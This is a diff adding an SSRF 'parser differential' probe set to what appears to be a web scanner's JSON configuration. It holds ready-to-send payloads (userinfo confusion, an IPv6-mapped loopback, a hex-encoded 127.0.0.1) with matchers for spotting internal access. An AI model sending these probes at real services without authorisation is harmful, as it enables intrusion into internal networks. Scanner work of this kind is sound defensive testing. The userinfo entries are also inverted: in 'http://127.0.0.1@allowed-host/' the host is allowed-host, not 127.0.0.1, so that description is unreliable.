@@ -640,6 +640,46 @@
           ]
         }
       ]
+    },
+    "ssrf_parser_differential": {
+      "description": "SSRF via URL parser differential. The host validator and the HTTP fetcher disagree about the destination because they parse the URL differently. Techniques: userinfo confusion (http://evil@benign/), backslash normalization (http://benign\\.evil.com/), fragment confusion (http://benign#@evil/), IPv6 scope-id (http://[::1%25eth0]/). L3akCTF 2026 Squid challenge demonstrated this against proxy validators.",
+      "probes": [
+        {
+          "payload": "http://127.0.0.1@allowed-host/",
+          "description": "Userinfo confusion \u2014 validator sees allowed-host, fetcher resolves 127.0.0.1 as the actual host (RFC 3986 userinfo)",
+          "matchers": [
+            {
+              "type": "status_diff"
+            },
+            {
+              "type": "word",
+              "words": [
+                "localhost",
+                "127.0.0.1",
+                "internal"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "http://[::ffff:127.0.0.1]/",
+          "description": "IPv6-mapped IPv4 bypass \u2014 many filters check for 127.0.0.1 but not its IPv6-mapped form",
+          "matchers": [
+            {
+              "type": "status_diff"
+            }
+          ]
+        },
+        {
+          "payload": "http://0x7f000001/",
+          "description": "Hex IP bypass \u2014 0x7f000001 = 127.0.0.1 in integer notation",
+          "matchers": [
+            {
+              "type": "status_diff"
+            }
+          ]
+        }
+      ]
     }
   },
   "craft_guidance": [
